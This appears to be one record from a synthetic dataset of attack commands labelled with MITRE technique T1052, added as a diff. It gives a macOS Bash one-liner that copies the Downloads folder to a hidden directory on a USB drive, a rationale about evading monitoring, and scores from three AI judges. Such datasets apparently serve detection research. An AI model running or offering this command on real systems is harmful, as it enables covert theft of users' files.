@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "diskutil mount disk2s1 && mkdir -p \"/Volumes/ARCHIVE/.dl\" && cp -Rp \"$HOME/Downloads\" \"/Volumes/ARCHIVE/.dl/\"",
+  "explanation": "Mounts a detected external partition and copies the Downloads folder to a concealed location on the USB.",
+  "rationale_steps": [
+    "Mount the removable media partition locally using diskutil.",
+    "Prepare a hidden destination directory on the USB volume.",
+    "Copy data preserving attributes to minimize anomalies.",
+    "Remain fully local to avoid network-based monitoring."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-06d48d2a-8b3244f9",
+  "source_prompt_hash": "06d48d2a",
+  "timestamp_utc": "2025-09-30T05:16:28.232349Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting, valid flags, and proper && separators make the pipeline well-formed and parseable on macOS.",
+        "semantic_score": 3,
+        "semantic_justification": "While it uses appropriate tools to mount and copy data to a hidden directory, it assumes the volume will mount at /Volumes/ARCHIVE (which may not match the actual mountpoint) and could thus fail or target an unintended/non-mounted path.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T06:51:33.941680Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid use of && separators, correct flag usage for diskutil, mkdir -p, and cp -Rp, and proper variable expansion with $HOME.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1052 by mounting an external USB partition (disk2s1), creating a hidden directory (prefixed with '.') on the mounted volume to conceal the exfiltrated data, and recursively copying the Downloads folder there — fully consistent with staging and transferring data to a physical medium on macOS.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-18T22:30:54.111343Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses standard Bash syntax with valid logical operators, correctly quoted variables, and proper flag usage for all three utilities.",
+        "semantic_score": 5,
+        "semantic_justification": "The sequence correctly leverages native macOS tools to mount external media, create a hidden staging directory, and recursively copy sensitive user data, perfectly aligning with T1052.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-18T22:30:56.252921Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
